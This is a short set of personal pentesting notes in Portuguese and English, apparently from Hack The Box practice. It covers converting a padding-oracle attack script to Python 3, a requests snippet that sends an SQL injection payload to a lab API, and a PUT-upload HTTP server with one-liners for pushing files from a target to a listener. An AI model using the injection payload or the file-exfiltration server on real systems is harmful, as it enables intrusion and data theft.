Utilities Python
========================

## Translate python 2 to 3

    2to3 

<https://docs.python.org/3/library/2to3.html>

Note no print abaixo que o script nao roda, por conta de erro de sintaxe:

![qownnotes-media-LXvWFU](../../media/qownnotes-media-LXvWFU.png)

Adequamos o script para python3 e funcionou direitinho:

```
2to3 -w /home/acosta/.local/lib/python3.11/site-packages/paddingoracle.py
```

![qownnotes-media-NXxuBo](../../media/qownnotes-media-NXxuBo.png)

![qownnotes-media-lXCIAP](../../media/qownnotes-media-lXCIAP.png)


## Python requests basic
```
import requests

url = 'http://intentions.htb/api/v1/gallery/user/genres'
myobj = {'genres': 'food,travel,nature' or 1 = 1#'}

x = requests.post(url, json = myobj)

print(x.text)

```

## Upload function http.server

```
##https://github.com/w0lfram1te/extended-http-server/blob/main/ehttpserver.py
## JUST PUT REQUESTS
## Path: ~/owncloud/Area_de_trabalho/tools/linux/6-Others/python
## python
##  python3 -c 'import requests; import os; filename="test.txt"; length=os.path.getsize(filename); requests.put("http://127.0.0.1:8000/"+filename, data=open(filename, "r").read(length))'


##  powershell
powershell -c "invoke-webrequest -method PUT -usebasicparsing -uri http://192.168.1.1:8000/test.txt -body (get-content test.txt)"

#!/usr/bin/python3

import http.server
import argparse

class ExtendedHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, directory=None, **kwargs):
        super().__init__(*args, **kwargs)

    def do_PUT(self):
        """Serve a PUT request."""
        try:
            path = self.translate_path(self.path)
            length = int(self.headers["Content-Length"])
            if False: 
                pass # for future input validation
            else:
                with open(path, 'wb') as fh:
                    fh.write(self.rfile.read(length))
                self.send_response(201, "Created")
                self.end_headers()
        except:
            self.send_response(500, "Internal Server Error")
            self.end_headers

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Extended HTTP Server by w0lfram1te')
    parser.add_argument('port', metavar='port', type=int, nargs='?', default=8000, help="listening port")
    parser.add_argument('-b','--bind', action='store', dest='bind', default='0.0.0.0', help="bind address")
    parser.add_argument('-p', '--port', action='store', dest='port', default=8000, help="listening port")
    args = parser.parse_args()

    print("[*] Running Extended HTTP Server")
    http.server.test(HandlerClass=ExtendedHTTPRequestHandler, port=args.port, bind=args.bind)

```

Pra fazere virar uma biblioteca, basta executar os eguinte comando:

    sudo cp upload_server.py /usr/lib/python3.11/http/upload_server.py
    python -m http.upload_server